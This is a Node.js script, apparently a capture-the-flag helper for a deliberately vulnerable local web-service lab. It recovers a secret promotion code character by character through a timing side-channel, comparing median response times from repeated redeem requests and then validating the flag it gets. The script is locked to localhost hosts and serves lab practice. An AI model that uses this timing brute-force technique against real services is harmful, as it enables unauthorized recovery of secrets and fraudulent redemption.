#!/usr/bin/env node
// Local CTF helper: recover the private campaign code using response times.
const { performance } = require('perf_hooks');

const token = process.env.DVWS_TOKEN;
const base = (process.env.DVWS_BASE_URL || 'http://127.0.0.1').replace(/\/$/, '');
if (!token) {
  console.error('Set DVWS_TOKEN to a token from POST /api/v2/login.');
  process.exit(1);
}
const host = new URL(base).hostname;
if (!['127.0.0.1', 'localhost', 'dvws.local'].includes(host)) {
  console.error('This helper runs against the local DVWS lab only.');
  process.exit(1);
}

async function post(path, body) {
  const start = performance.now();
  const response = await fetch(`${base}/api${path}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  return { status: response.status, body: await response.json(), ms: performance.now() - start };
}

async function main() {
  let prefix = 'OPS-';
  const alphabet = '0123456789ABCDEF';
  for (let position = 0; position < 12; position++) {
    const results = [];
    for (const character of alphabet) {
      const candidate = prefix + character;
      const samples = [];
      for (let attempt = 0; attempt < 3; attempt++) {
        const result = await post('/v2/resource-store/promotions/redeem', { code: candidate });
        if (result.status === 200 && result.body.flag) {
          const check = await post('/v2/resource-store/promotions/timing/validate', { flag: result.body.flag });
          if (check.status !== 200 || check.body.valid !== true) throw new Error('Flag validation failed.');
          console.log(`Code: ${candidate}\nCredits: ${result.body.credits}\nFlag: ${result.body.flag}\nValidated: true`);
          return;
        }
        if (result.status !== 404) throw new Error(`Unexpected HTTP ${result.status}: ${JSON.stringify(result.body)}`);
        samples.push(result.ms);
      }
      samples.sort((a, b) => a - b);
      results.push({ candidate, median: samples[1] });
    }
    results.sort((a, b) => b.median - a.median);
    prefix = results[0].candidate;
    console.log(`Recovered prefix: ${prefix}`);
  }
  throw new Error('No promotion was redeemed. Retry on an idle local lab.');
}

main().catch((error) => {
  console.error(error.message);
  process.exitCode = 1;
});
